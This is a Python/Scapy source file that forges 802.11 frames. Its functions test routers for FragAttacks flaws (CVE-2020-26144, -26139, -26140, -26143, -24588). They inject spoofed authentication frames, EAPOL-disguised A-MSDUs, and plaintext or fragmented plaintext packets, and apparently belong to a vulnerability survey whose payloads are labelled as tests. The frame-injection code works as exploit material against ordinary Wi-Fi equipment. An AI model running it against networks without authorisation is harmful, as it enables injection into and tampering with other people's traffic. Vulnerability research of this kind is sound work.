from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Auth
from scapy.layers.inet import IP, ICMP
from scapy.layers.eap import EAPOL
from scapy.layers.l2 import Ether
from colorama import Fore, Back, Style

from main import *


TIMES_TO_SEND = 2
IP_SERVER = ""

# Create the SC field, this is a combination of the fragment number and the sequence number
def createSC(frag, seq):
    return (seq << 4) + frag

# Authenticates and associate to a network
def authenticationAssociation(inf, inf_mac, ssid, bssid, rates, rsn, htCapabilities, esrates):

    ALGO_OPEN_AUTH = 0
    START_SEQNUM = 1
    STATUS_SUCCESS = 0
    AUTHENTICATION = 11

    # authentication
    sendArray = []
    for i in range(0, TIMES_TO_SEND):
        frame1 = RadioTap() \
                 / Dot11(type=0, subtype=AUTHENTICATION, addr1=bssid, addr2=inf_mac, addr3=bssid, SC=createSC(0, i)) \
                 / Dot11Auth(algo=ALGO_OPEN_AUTH, seqnum=START_SEQNUM, status=STATUS_SUCCESS) \

        sendArray.append(frame1)
    sendp(sendArray, iface=inf)

    # / Dot11AssoReq() \
    HT_CAPABILITIES = 45
    sendArray = []
    for i in range(0, TIMES_TO_SEND):
        frame2 = RadioTap() \
                 / Dot11(type=0, subtype=0, addr1=bssid, addr2=inf_mac, addr3=bssid, SC=createSC(0, i)) \
                 / Raw(b'\x31\x04\x01\x00') \
                 / Dot11Elt(ID='SSID', info=ssid) \
                 / Dot11Elt(ID='Rates', info=rates)

        if rsn != False:
            frame2 = frame2 / Dot11Elt(ID='RSNinfo', info=rsn)

        if htCapabilities != False:
            frame2 = frame2 / Dot11Elt(ID=HT_CAPABILITIES, info=htCapabilities)

        # esrates are not always necessary to associate to a network
        if esrates != False:
            frame2 = frame2 / Dot11Elt(ID=50, info=esrates)
        sendArray.append(frame2)

    sendp(sendArray, iface=inf)


# Paper section 6.5, CVE-2020-26144
## Cloaking A-MSDUs as handshake frames: send a plaintext A-MSDU whose first 8 bytes are a valid EAPOL LLC/SNAP header, first packet will be invalid, second plaintext packet will be accepted
## First check if EAPOL frame, than accept full packet, and execute the second plaintext fragment
## THERE MUST BE A DEVICE CONNECTED TO THE ROUTER
def eapolAmsdu(router_mac, interface, sender_mac):
    TYPE_DATA = 2
    SUBTYPE_QOSDATA = 8

    sendArray = []
    # create a frame, existing of 2 fragments
    for i in range(0, TIMES_TO_SEND):
        header = RadioTap() \
                / Dot11(type=TYPE_DATA, subtype=SUBTYPE_QOSDATA, FCfield="to-DS", addr1=router_mac, addr2=sender_mac, SC=createSC(0, i)) \
                / Dot11QoS(A_MSDU_Present=1)
        subframe1 = LLC() \
                / SNAP() \
                / EAPOL() \
                / Raw(b'\x00\x06\x41\x41\x41\x41\x41\x41')
        subframe2 = Ether(dst="ff:ff:ff:ff:ff:ff", src=sender_mac, type=78 ) \
                / LLC() \
                / SNAP() \
                / IP(src="127.0.0.1", dst="127.0.0.1") \
                / ICMP(type=8) \
                / Raw(b'This is a test, see survey.anonimized.com')

        frame = header / subframe1 / subframe2
        sendArray.append(frame)

    return sendArray
    
"""
def eapolAmsduValidSenderMac(router_macList, macList, interface):
    # MERK OP: er moet een apparaat mee verbonden zijn voordat hij gaat broadcasten
    TYPE_DATA = 2
    SUBTYPE_QOSDATA = 8
    sendArray = []

    # create a frame, existing of 2 fragments
    for i in range(0, TIMES_TO_SEND):
        for j in range(0, len(macList)):
            header = RadioTap() \
                    / Dot11(type=TYPE_DATA, subtype=SUBTYPE_QOSDATA, FCfield="to-DS", addr1=router_macList[j], addr2=macList[j], SC=createSC(0, i)) \
                    / Dot11QoS(A_MSDU_Present=1)
            subframe1 = LLC() \
                    / SNAP() \
                    / EAPOL() \
                    / Raw(b'\x00\x06\x41\x41\x41\x41\x41\x41')
            subframe2 = Ether(dst="ff:ff:ff:ff:ff:ff", src=macList[j], type=78 ) \
                    / LLC() \
                    / SNAP() \
                    / IP(src="127.0.0.1", dst="127.0.0.1") \
                    / ICMP(type=8) \
                    / Raw(b'This is a test, see survey.anonimized.com')

            frame = header / subframe1 / subframe2
            sendArray.append(frame)

    return sendArray
"""

# Paper section 6.6, CVE-2020-26139
## test if a router forwards plaintext eapol frames to another connected device while de sender is not yet authenticated.
def eapolForward(router_mac, interface, sender_mac, recipient_mac):

    TYPE_DATA = 2
    SUBTYPE_QOSDATA = 8

    #Dot11Qos
    sendArray = []
    for i in range(0,TIMES_TO_SEND):
        frame = RadioTap() \
                / Dot11(type=TYPE_DATA, subtype=SUBTYPE_QOSDATA, FCfield="to-DS", addr1=router_mac, addr2=sender_mac, addr3=recipient_mac, SC=createSC(0, i)) \
                / Raw(b'\x02\x00') \
                / LLC() \
                / SNAP() \
                / EAPOL() \
                / Raw(b'This is a test, see survey.anonimized.com')

        sendArray.append(frame)

    return sendArray

# Paper section 6.3, CVE-2020-26140
## test if a router accept a plaintext frame
## !!! There must be a device connected and the mac and ip address must be known
"""
def plaintext(router_macList, macList, interface, indexList):

    TYPE_DATA = 2
    SUBTYPE_QOSDATA = 8
    mostUsedIPaddresses = ["192.168.169.101", "192.168.0.1", "192.168.0.2", "192.168.1.1","192.168.1.2", "192.168.2.1", "192.168.2.2", "192.168.3.1", "192.168.3.2", "192.168.4.1", "192.168.4.2"]
    sendArray = []

    for k in range(1,2):
        for i in range(0, len(macList)):
            for j in mostUsedIPaddresses:
                frame = RadioTap() \
                        / Dot11(type=TYPE_DATA, subtype=SUBTYPE_QOSDATA, FCfield="to-DS", addr1=router_macList[i],
                                addr2=macList[i], addr3=router_macList[i], SC=createSC(0, k)) \
                        / Dot11QoS() \
                        / LLC() \
                        / SNAP() \
                        / IP(src=j, dst=IP_SERVER) \
                        / ICMP(type=8) \
                        / Raw(b'plaintext test, see survey.anonimized.com' + bytes(str(indexList[i]), 'UTF-8'))

                sendArray.append(frame)
                #sendp(frame, iface=interface) # sendArray isn't reliable for some reason
    return sendArray
"""
def plaintext(router, device, index):

    TYPE_DATA = 2
    SUBTYPE_QOSDATA = 8
    mostUsedIPaddresses = ["192.168.169.101", "192.168.0.1", "192.168.0.2", "192.168.1.1","192.168.1.2", "192.168.2.1", "192.168.2.2", "192.168.3.1", "192.168.3.2", "192.168.4.1", "192.168.4.2"]
    sendArray = []

    for k in range(1,2):
        for i in range(0, len(macList)):
            for j in mostUsedIPaddresses:
                frame = RadioTap() \
                        / Dot11(type=TYPE_DATA, subtype=SUBTYPE_QOSDATA, FCfield="to-DS", addr1=router,
                                addr2=device, addr3=router, SC=createSC(0, k)) \
                        / Dot11QoS() \
                        / LLC() \
                        / SNAP() \
                        / IP(src=j, dst=IP_SERVER) \
                        / ICMP(type=8) \
                        / Raw(b'plaintext test, see survey.anonimized.com' + bytes(str(index), 'UTF-8'))

                sendArray.append(frame)
    return sendArray



# Paper section 6.3, CVE-2020-26143
## test if a router accept a FRAGMENTED plaintext frame
## !!! There must be a device connected and the mac and ip address must be known
"""
def plaintextFragmented(router_macList, macList, interface, indexList):

    TYPE_DATA = 2
    SUBTYPE_QOSDATA = 8
    mostUsedIPaddresses = ["192.168.169.101", "192.168.0.1", "192.168.0.2", "192.168.1.1","192.168.1.2", "192.168.2.1", "192.168.2.2", "192.168.3.1", "192.168.3.2", "192.168.4.1", "192.168.4.2"]
    sendArray = []

    for k in range(1,2):
        for i in range(0, len(macList)):
            for j in mostUsedIPaddresses:
                payload = LLC() \
                          / SNAP() \
                          / IP(src=j, dst=IP_SERVER) \
                          / ICMP(type=8) \
                          / Raw(b'This is a test, see survey.anonimized.com') \
                          / Raw(b'plaintext_ping_fragmented_server' + bytes(str(indexList[i]), 'UTF-8'))

                payload = raw(payload)
                lenPayload = len(payload)
                payload1 = payload[0: lenPayload // 2]
                payload2 = payload[lenPayload // 2: lenPayload]

                frame1 = RadioTap() \
                         / Dot11(type=TYPE_DATA, subtype=SUBTYPE_QOSDATA, FCfield="to-DS", addr1=router_macList[i],
                                 addr2=macList[i], addr3=router_macList[i], SC=createSC(0, k)) \
                         / Raw(b'\x02\x00') \
                         / Raw(payload1)
                frame1.FCfield |= Dot11(FCfield="MF").FCfield

                frame2 = RadioTap() \
                         / Dot11(type=TYPE_DATA, subtype=SUBTYPE_QOSDATA, FCfield="to-DS", addr1=router_macList[i],
                                 addr2=macList[i], addr3=router_macList[i], SC=createSC(1, k)) \
                         / Raw(b'\x02\x00') \
                         / Raw(payload2)

                sendArray.append(frame1)
                sendArray.append(frame2)
                #sendp([frame1, frame2], iface=interface)
    return sendArray
"""

def plaintextFragmented(router, device, index):

    TYPE_DATA = 2
    SUBTYPE_QOSDATA = 8
    mostUsedIPaddresses = ["192.168.169.101", "192.168.0.1", "192.168.0.2", "192.168.1.1","192.168.1.2", "192.168.2.1", "192.168.2.2", "192.168.3.1", "192.168.3.2", "192.168.4.1", "192.168.4.2"]
    sendArray = []

    for k in range(1,2):
        for j in mostUsedIPaddresses:
            payload = LLC() \
                      / SNAP() \
                      / IP(src=j, dst=IP_SERVER) \
                      / ICMP(type=8) \
                      / Raw(b'This is a test, see survey.anonimized.com') \
                      / Raw(b'plaintext_ping_fragmented_server' + bytes(str(index), 'UTF-8'))

            payload = raw(payload)
            lenPayload = len(payload)
            payload1 = payload[0: lenPayload // 2]
            payload2 = payload[lenPayload // 2: lenPayload]

            frame1 = RadioTap() \
                     / Dot11(type=TYPE_DATA, subtype=SUBTYPE_QOSDATA, FCfield="to-DS", addr1=router,
                             addr2=device, addr3=router, SC=createSC(0, k)) \
                     / Raw(b'\x02\x00') \
                     / Raw(payload1)
            frame1.FCfield |= Dot11(FCfield="MF").FCfield

            frame2 = RadioTap() \
                     / Dot11(type=TYPE_DATA, subtype=SUBTYPE_QOSDATA, FCfield="to-DS", addr1=router,
                             addr2=device, addr3=router, SC=createSC(1, k)) \
                     / Raw(b'\x02\x00') \
                     / Raw(payload2)

            sendArray.append(frame1)
            sendArray.append(frame2)
    return sendArray


# Paper section 6.3, CVE-2020-26140
## test if a router accept a plaintext frame
## !!! There must be a device connected and the mac and ip address must be known
## test it with a broadcast instead of a ping to a server (where a valid ip is required)
"""
def plaintextBroadcast(router_macList, macList, interface):

    TYPE_DATA = 2
    SUBTYPE_QOSDATA = 8
    sendArray = []

    # addr2 has to be a fully connected device
    for i in range(0,TIMES_TO_SEND):
        for j in range(0, len(macList)):
            frame = RadioTap() \
                / Dot11(type=TYPE_DATA, subtype=SUBTYPE_QOSDATA, FCfield="to-DS", addr1=router_macList[j],
                        addr2=macList[j], addr3="ff:ff:ff:ff:ff:ff", SC=createSC(0, i)) \
                / Dot11QoS() \
                / LLC() \
                / SNAP() \
                / IP(src="127.0.0.1", dst="127.0.0.1") \
                / ICMP(type=8) \
                / Raw(b'This is a test, see survey.anonimized.com aaaaaaaaaaaaaaaa') \

            sendArray.append(frame)

    return sendArray
"""

def plaintextBroadcast(router, device):

    TYPE_DATA = 2
    SUBTYPE_QOSDATA = 8
    sendArray = []

    # addr2 has to be a fully connected device
    for i in range(0,TIMES_TO_SEND):
        frame = RadioTap() \
            / Dot11(type=TYPE_DATA, subtype=SUBTYPE_QOSDATA, FCfield="to-DS", addr1=router,
                    addr2=device, addr3="ff:ff:ff:ff:ff:ff", SC=createSC(0, i)) \
            / Dot11QoS() \
            / LLC() \
            / SNAP() \
            / IP(src="127.0.0.1", dst="127.0.0.1") \
            / ICMP(type=8) \
            / Raw(b'This is a test, see survey.anonimized.com aaaaaaaaaaaaaaaa') \

        sendArray.append(frame)

    return sendArray

# Paper section 6.3, CVE-2020-26143
## test if a router accept a FRAGMENTED plaintext frame
## !!! There must be a device connected and the mac and ip address must be known
## test it with a broadcast instead of a ping to a server (where a valid ip is required)
"""
def plaintextBroadcastFragmented(router_macList, macList, interface):

    TYPE_DATA = 2
    SUBTYPE_QOSDATA = 8
    sendArray = []

    for i in range(0,TIMES_TO_SEND):
        for j in range(0, len(macList)):

            payload = LLC() \
                    / SNAP() \
                    / IP(src="127.0.0.1", dst="127.0.0.1") \
                    / ICMP(type=8) \
                    / Raw(b'This is a test, see survey.anonimized.com') \

            payload = raw(payload)
            lenPayload = len(payload)
            payload1 = payload[0: lenPayload // 2]
            payload2 = payload[lenPayload // 2: lenPayload]

            frame1 = RadioTap() \
                     / Dot11(type=TYPE_DATA, subtype=SUBTYPE_QOSDATA, FCfield="to-DS", addr1=router_macList[j],
                             addr2=macList[j], addr3="ff:ff:ff:ff:ff:ff", SC=createSC(0, i)) \
                     / Raw(b'\x02\x00') \
                     / Raw(payload1)
            frame1.FCfield |= Dot11(FCfield="MF").FCfield

            frame2 = RadioTap() \
                     / Dot11(type=TYPE_DATA, subtype=SUBTYPE_QOSDATA, FCfield="to-DS", addr1=router_macList[j],
                             addr2=macList[j], addr3="ff:ff:ff:ff:ff:ff", SC=createSC(1, i)) \
                     / Raw(b'\x02\x00') \
                     / Raw(payload2)

            sendArray.append(frame1)
            sendArray.append(frame2)
    return sendArray
"""

def plaintextBroadcastFragmented(router, device):

    TYPE_DATA = 2
    SUBTYPE_QOSDATA = 8
    sendArray = []

    for i in range(0,TIMES_TO_SEND):
        payload = LLC() \
                / SNAP() \
                / IP(src="127.0.0.1", dst="127.0.0.1") \
                / ICMP(type=8) \
                / Raw(b'This is a test, see survey.anonimized.com') \

        payload = raw(payload)
        lenPayload = len(payload)
        payload1 = payload[0: lenPayload // 2]
        payload2 = payload[lenPayload // 2: lenPayload]

        frame1 = RadioTap() \
                 / Dot11(type=TYPE_DATA, subtype=SUBTYPE_QOSDATA, FCfield="to-DS", addr1=router,
                         addr2=device, addr3="ff:ff:ff:ff:ff:ff", SC=createSC(0, i)) \
                 / Raw(b'\x02\x00') \
                 / Raw(payload1)
        frame1.FCfield |= Dot11(FCfield="MF").FCfield

        frame2 = RadioTap() \
                 / Dot11(type=TYPE_DATA, subtype=SUBTYPE_QOSDATA, FCfield="to-DS", addr1=router,
                         addr2=device, addr3="ff:ff:ff:ff:ff:ff", SC=createSC(1, i)) \
                 / Raw(b'\x02\x00') \
                 / Raw(payload2)

        sendArray.append(frame1)
        sendArray.append(frame2)
    return sendArray


# Paper section 3.2 (CVE-2020-24588)
# test if a network is vulnerable to the fragmentation attack  (only enterprise networks)
def fragmentationEnterprise(router_mac, interface, sender_mac):

    TYPE_DATA = 2
    SUBTYPE_QOSDATA = 8

    sendArray =[]
    for i in range(0,TIMES_TO_SEND):

        # Identity response frame
        header = RadioTap() \
                 / Dot11(type=TYPE_DATA, subtype=SUBTYPE_QOSDATA, FCfield="to-DS", addr1=router_mac, addr2=sender_mac,
                         addr3=router_mac, SC=createSC(0, i)) \
                 / Dot11QoS(A_MSDU_Present=1)
        subframe1 = LLC() \
                    / SNAP() \
                    / EAPOL() \
                    / Raw(b'\x00\x06\x41\x41\x41\x41\x41\x41')
        subframe2 = Ether(dst=router_mac, src=sender_mac, type=30) \
                    / LLC() \
                    / SNAP() \
                    / EAPOL(type=0, version=1) \
                    / EAP(type=1, code=2, id=1) \
                    / Raw(b"test@test.org")

        frame = header / subframe1 / subframe2
        sendArray.append(frame)

    return sendArray